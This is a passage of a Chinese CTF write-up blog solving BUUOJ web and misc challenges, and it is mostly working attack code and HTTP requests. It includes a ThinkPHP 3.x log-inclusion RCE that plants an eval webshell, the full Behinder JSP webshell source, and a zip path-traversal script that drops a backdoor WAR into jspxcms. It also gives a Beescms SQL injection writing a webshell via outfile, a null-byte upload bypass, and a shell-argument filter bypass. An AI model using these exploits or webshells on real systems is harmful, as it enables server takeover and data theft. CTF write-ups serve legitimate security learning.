(!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))<br>    &#123;<br>        <span class="hljs-variable">$cmd</span> = escapeshellarg(<span class="hljs-variable">$cmd</span>);<br>        system(<span class="hljs-string">&#x27;cat &#x27;</span> . <span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>hint提示管理员曾访问过flag，查看日志</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?cmd=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure>
<p>得到flag文件为/this_is_final_flag_e2a457126032b42d.php</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">?cmd=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>inal<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>e<span class="hljs-number">2</span>a<span class="hljs-number">457126032</span>b<span class="hljs-number">42</span>d.php<br></code></pre></td></tr></table></figure>
<p>过滤了flag关键字，配合escapeshellarg函数绕过：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p>
<p>当escapeshellarg（）从UTF-8字符串中剥离非ASCII字符时，添加以下内容修复了该问题：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;?php<br>setlocale(LC_CTYPE, <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>);<br>?&gt;<br>  <br> Under Windows, this function puts <span class="hljs-built_in">string</span> <span class="hljs-keyword">into</span> double-quotes, <span class="hljs-keyword">not</span> single, <span class="hljs-keyword">and</span> replaces %(percent sign) <span class="hljs-keyword">with</span> a <span class="hljs-literal">space</span>, <span class="hljs-keyword">that</span>&#x27;s why <span class="hljs-keyword">it</span>&#x27;s impossible <span class="hljs-keyword">to</span> pass a filename <span class="hljs-keyword">with</span> percents <span class="hljs-keyword">in</span> <span class="hljs-keyword">its</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">through</span> this function.<br> <br>在Windows下，此函数将字符串放在双引号中，而不是单引号中，并用空格替换%（百分号），这就是为什么无法通过此函数传递名称中带有百分数的文件名的原因。<br></code></pre></td></tr></table></figure>
<p>在flag字符之间添加一个非ascii字符，然后unicode绕一下flag正则</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?cmd=this_is_final_fl%faag_e2a457126032b42d.php</span><br><span class="xml"> #</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;cb3043a6-bfe6-4c6d-a75e-fc77e27de779&#125;&#x27;</span>; <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>






<h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><h4 id="ThinkPHP-3-x-日志包含RCE-getshell"><a href="#ThinkPHP-3-x-日志包含RCE-getshell" class="headerlink" title="ThinkPHP 3.x 日志包含RCE getshell"></a>ThinkPHP 3.x 日志包含RCE getshell</h4><p>TP3.2.3日志漏洞:<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/topic/58651.html">https://www.thinkphp.cn/topic/58651.html</a></p>
<p>ThinkPHP3.2.x RCE漏洞通报：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p>
<p>通过输入http://域名/应用名（默认为Application，很多开发者不会改它）/Runtime/Logs/组名（默认为Home或者Index，很多开发者不会改它）/18_08_15.log的方式即可访问日志文件</p>
<p>POC</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">写入phpinfo()<br>GET <span class="hljs-regexp">/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/</span><span class="hljs-number">1.1</span><br>Host: c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90.0</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,*/*;q=<span class="hljs-number">0.8</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=<span class="hljs-number">3</span>nctjnqfd39jl28bg59mnaf2b5<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br><br>  <br>查看日志，注意日志时间<br>GET <span class="hljs-regexp">/index.php/</span>?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.<span class="hljs-regexp">/Application/</span>Runtime<span class="hljs-regexp">/Logs/</span>Common/<span class="hljs-number">21</span>_08_02.log<br><br>上shell<br>GET /index.php?m=--&gt;&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;atkx&quot;</span>]);?&gt;<br><br>蚁剑连接：<br>http:<span class="hljs-regexp">//</span>c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<span class="hljs-regexp">/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Common/</span><span class="hljs-number">21</span>_08_02.log<br>pass：atkx<br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功</p>
<p>ThinkphpGUI工具getshell</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png" alt="image-20210815121015293"></p>
<p>相关信息;</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">检测漏洞 ThinkPHP <span class="hljs-number">3</span>.x Log RCE中......<br>[+] 存在ThinkPHP <span class="hljs-number">3</span>.x Log RCE<br>Payload: http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log<br>[+] http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log   Pass:peiqi<br></code></pre></td></tr></table></figure>


<p>蚁剑连接成功</p>
<h2 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h2><h4 id="jspxcms解压getshell漏洞"><a href="#jspxcms解压getshell漏洞" class="headerlink" title="jspxcms解压getshell漏洞"></a>jspxcms解压getshell漏洞</h4><p><a target="_blank" rel="noopener" href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/</a></p>
<p>admin空密码登录后台，进入后台管理页面：/cmscp/index.do找到漏洞存在的功能页面。</p>
<p>这里用冰蝎自带的马shell.jsp</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
<p>生成war，把shell.jsp和jar.exe放至同一目录下</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cf <span class="hljs-keyword">shell.war </span>*<br></code></pre></td></tr></table></figure>
<p>所以选择脚本写入</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import zipfile<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;test.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    temp=f.<span class="hljs-built_in">read</span>()<br><br>z.writestr(<span class="hljs-string">&#x27;../../../shell.war&#x27;</span>,temp)  <span class="hljs-comment">#shell.war为上一步生产的后门war包</span><br>z.<span class="hljs-built_in">close</span>()<br>    <br>      <br>      <br>import zipfile<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>binary=f.<span class="hljs-built_in">read</span>()<br>f.<span class="hljs-built_in">close</span>()<br>binary1 = b<span class="hljs-string">&#x27;123123&#x27;</span><br>zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;tests.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>info = zipfile.ZipInfo(<span class="hljs-string">&quot;tests.zip&quot;</span>)<br>zipFile.writestr(<span class="hljs-string">&quot;../../../shells.war&quot;</span>, binary)<br>zipFile.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>
<p>上传生成的test.zip</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png" alt="image-20210815122131241"></p>
<p>注意解压，然后冰蝎连接</p>
<p><a target="_blank" rel="noopener" href="http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/cmscp/index.do">http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/</a>shell/shell.jsp</p>
<p>pass：rebeyond</p>
<h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><h4 id="Beescms-v4-0-sql注入漏洞分析"><a href="#Beescms-v4-0-sql注入漏洞分析" class="headerlink" title="Beescms_v4.0 sql注入漏洞分析"></a>Beescms_v4.0 sql注入漏洞分析</h4><p>后台注入outfile :<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p>
<p>/<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码是beescms，/var/www/html/</p>
<p>sql注入outfile写webshell，过滤了空格，用然/**/代替，后连接webshell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">215</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn/admin/login.php<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=om<span class="hljs-number">10447</span>imss<span class="hljs-number">7</span>jbttdpjm<span class="hljs-number">5</span>lsf<span class="hljs-number">24</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">user</span>=admin&#x27;/**/union/**/selselectect/**/<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">3</span>d<span class="hljs-number">406576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>b<span class="hljs-number">2761746</span>b<span class="hljs-number">78275</span>d<span class="hljs-number">293</span>f<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>/**/into/**/outoutfilefile/**/&#x27;/var/www/html/atkx.php&#x27;#&amp;password=<span class="hljs-number">123456</span>&amp;code=&amp;submit=true&amp;submit.x=<span class="hljs-number">47</span>&amp;submit.y=-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功getflag </p>
<h2 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h2><p>00截断</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /qbl.php?id=<span class="hljs-number">1</span>.php%<span class="hljs-number">0012312312321321</span>&amp;url=http://baidu.com HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: https://hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span>/sc.php?id=<span class="hljs-number">12312312321321</span>&amp;url=http://baidu.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">86</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">img</span>=data%<span class="hljs-number">3</span>Aimage%<span class="hljs-number">2</span>Fpng%<span class="hljs-number">3</span>Bbase<span class="hljs-number">64</span>%<span class="hljs-number">2</span>CR<span class="hljs-number">0</span>lGODk<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocApwaHBpbmZvKCk<span class="hljs-number">7</span>CkBldmFsKCRfUE<span class="hljs-number">9</span>TVFsxXSk<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>


<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs maxima">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg -E <span class="hljs-string">&quot;b1,g,lsb,xy&quot;</span> ezSteganography-flag.png &gt; out.png<br><br><br><br>First <span class="hljs-built_in">part</span> of flag <span class="hljs-built_in">is</span>:flag&#123;2e9ec6480d0515<br>QIM quantization <span class="hljs-built_in">is</span> useful to <span class="hljs-built_in">get</span> another flag.<span class="hljs-keyword">step</span> <span class="hljs-built_in">is</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>


<p>QIM量化</p>
<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> <span class="hljs-type">Image</span><br><span class="hljs-keyword">from</span> <span class="hljs-type">Crypto</span>.<span class="hljs-type">Util</span> <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>def extract(delta,y):<br>	<span class="hljs-keyword">out</span>=[]<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (delta/<span class="hljs-number">2</span>-y%delta):<br>		<span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">out</span>=np.<span class="hljs-built_in">array</span>(<span class="hljs-keyword">out</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><br><br>p=np.<span class="hljs-built_in">array</span>(<span class="hljs-type">Image</span>.open(&#x27;ezSteganography-flag.png&#x27;))<br>R,G,B=p[:,:,<span class="hljs-number">0</span>],p[:,:,<span class="hljs-number">1</span>],p[:,:,<span class="hljs-number">2</span>]<br>G=G.ravel()<br><br>te_out=extract(<span class="hljs-number">20</span>,G)<br>plt.imshow(np.<span class="hljs-built_in">array</span>(te_out).reshape(<span class="hljs-number">1440</span>,<span class="hljs-number">2560</span>))<br>plt.show()<br></code></pre></td></tr></table></figure>


<p>得到另一半flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png" alt="image-20210815122241546"></p>
<h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *       <span class="hljs-comment">#需要用到pwntools模块</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25900</span>)        <span class="hljs-comment">#连接，相当于nc，注：25900是端口，每一次开靶机基本上都不同</span><br>payload = [<span class="hljs-string">&#x27;r&#x27;</span>] * <span class="hljs-number">66</span>    <span class="hljs-comment">#先把答案设置成66个‘r’</span><br>restart = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> restart:<br>    restart = <span class="hljs-number">0</span>        <span class="hljs-comment">#先把restart改为0，避免死循环</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">66</span>):        <span class="hljs-comment">#循环发送答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:&#x27;</span>)        <span class="hljs-comment">#接收函数，一直接收，直到接收到设定的字符串才进行下一语句</span><br>        io.sendline(payload[i])        <span class="hljs-comment">#发送函数，上传第i个答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Team&#x27;</span>)<br>        io.recvuntil(<span class="hljs-string">&quot;Team\n&quot;</span>)        <span class="hljs-comment">#因为输入一个答案后会有两个&#x27;Team&#x27;的字符串，所以接收两个‘Team&#x27;后进行下一语句</span><br>        p = io.recv(<span class="hljs-number">10</span>)        <span class="hljs-comment">#接收函数，可控制接收的字符数量，这里接收10个字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The number&#x27;</span> in p:        <br>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment">#接收到&#x27;The number&#x27;则说明这个答案对了，继续进行下一个for语句发送下一个答案</span><br>        <span class="hljs-keyword">else</span>:<br>            io.recvuntil(<span class="hljs-string">&#x27;Play again? (y/n): &#x27;</span>)         <span class="hljs-comment">#如果没有接收到&#x27;The number&#x27;,则第i个答案错误，接收完字符</span><br>            payload[i] = <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-comment">#将第i个答案改正</span><br>            io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)        <span class="hljs-comment">#发送‘y’重新游戏</span><br>            restart = <span class="hljs-number">1</span>         <span class="hljs-comment">#将restart改为1，将会重新while循环</span><br>            <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 